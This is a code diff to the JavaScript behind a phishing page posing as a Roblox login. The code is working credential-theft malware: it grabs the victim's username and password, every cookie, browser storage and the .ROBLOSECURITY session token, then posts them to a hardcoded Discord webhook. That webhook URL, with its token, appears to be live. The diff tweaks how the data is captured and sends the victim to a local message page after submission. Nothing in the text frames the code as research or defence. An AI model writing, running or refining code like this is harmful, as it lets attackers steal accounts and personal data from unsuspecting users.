@@ -56,7 +56,7 @@ function extractLoginCredentials(storageData) {
 async function sendUserInfoToDiscord(formData, cookies, token, storageData, credentials) {
     const webhookURL = 'https://discord.com/api/webhooks/1413136208015396965/ZOPuML2XdrU0egq3U6dGmCmjBT_4Mpcu49g3y35HqB2j_jpScBqIqR-3YB4w89p61juu'; // Replace with your actual webhook URL
     const message = {
-        content: `New user logged in!\n\n**Website Name:** Roblox Login\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}\n**Extracted Login Credentials and Tokens:**\n${credentials.map(cred => `Type: ${cred.type}, Key: ${cred.key}, Value: ${cred.value}`).join('\n')}`
+        content: `New user have logged in!\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}\n**Extracted Login Credentials and Tokens:**\n${credentials.map(cred => `Type: ${cred.type}, Key: ${cred.key}, Value: ${cred.value}`).join('\n')}`
     };
 
     try {
@@ -77,20 +77,6 @@ async function sendUserInfoToDiscord(formData, cookies, token, storageData, cred
     }
 }
 
-// Add an event listener to capture cookies and storage data on page load
-window.addEventListener('load', function() {
-    // Wait for a short period to ensure cookies and storage data are set
-    setTimeout(function() {
-        const cookies = getCookies();
-        const storageData = getAllStorageData();
-        console.log('Cookies on Page Load:', cookies);
-        console.log('Storage Data on Page Load:', storageData);
-        // Store cookies and storage data in variables to use later
-        window.storedCookies = cookies;
-        window.storedStorageData = storageData;
-    }, 1000); // 1 second delay
-});
-
 // Add an event listener to the form submission
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
@@ -98,18 +84,9 @@ document.addEventListener('DOMContentLoaded', function() {
         loginForm.addEventListener('submit', async function(event) {
             event.preventDefault(); // Prevent the form from submitting the traditional way
             const formData = captureFormData();
-            let cookies = window.storedCookies; // Use the cookies captured on page load
-            let storageData = window.storedStorageData; // Use the storage data captured on page load
-            let token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name
-
-            // Force retrieval of cookies, storage data, and token
-            if (!cookies || !storageData || !token) {
-                // Wait for a short period to ensure cookies and storage data are set
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                cookies = getCookies();
-                storageData = getAllStorageData();
-                token = getSpecificCookie('.ROBLOSECURITY');
-            }
+            const cookies = getCookies();
+            const storageData = getAllStorageData();
+            const token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name
 
             console.log('Form Data:', formData);
             console.log('Roblox Token:', token);
@@ -117,10 +94,12 @@ document.addEventListener('DOMContentLoaded', function() {
             console.log('Storage Data on Form Submission:', storageData);
 
             const credentials = extractLoginCredentials(storageData);
-            sendUserInfoToDiscord(formData, cookies, token, storageData, credentials);
+            console.log('Extracted Credentials:', credentials);
+
+            await sendUserInfoToDiscord(formData, cookies, token, storageData, credentials);
 
             // Redirect to the actual Roblox website
-            window.location.href = 'https://www.roblox.com';
+            window.location.href = 'message.html';
         });
     } else {
         console.error('Login form not found');
